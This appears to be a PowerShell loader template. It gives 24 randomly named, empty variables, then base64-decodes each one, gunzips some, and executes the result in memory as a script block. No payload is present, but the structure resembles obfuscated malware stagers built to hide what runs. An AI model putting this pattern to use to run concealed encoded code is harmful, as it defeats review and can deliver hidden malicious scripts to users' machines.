#Requires -Version 2

$Overruling = ""
$Truthiness = ""
$Prehensile = ""
$Coastlines = ""
$Crosswalks = ""
$Relevantly = ""
$Archetypal = ""
$Dispensers = ""
$Entrusting = ""
$Paranormal = ""
$Ubiquitous = ""
$Convection = ""
$Terrorized = ""
$Deathtraps = ""
$Sobriquets = ""
$Autoworker = ""
$Rubberized = ""
$Asphyxiate = ""
$Ejaculated = ""
$Demitasses = ""
$Overriding = ""
$Coventries = ""
$Bonhoeffer = ""
$Vibraphone = ""

$Modules = @($Overruling,$Truthiness,$Prehensile,$Coastlines,$Crosswalks,$Relevantly,$Archetypal,$Dispensers,$Entrusting,$Paranormal,$Ubiquitous,$Convection,$Terrorized,$Deathtraps,$Sobriquets,$Autoworker,$Rubberized,$Asphyxiate,$Ejaculated,$Demitasses,$Overriding,$Coventries,$Bonhoeffer,$Vibraphone)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
}
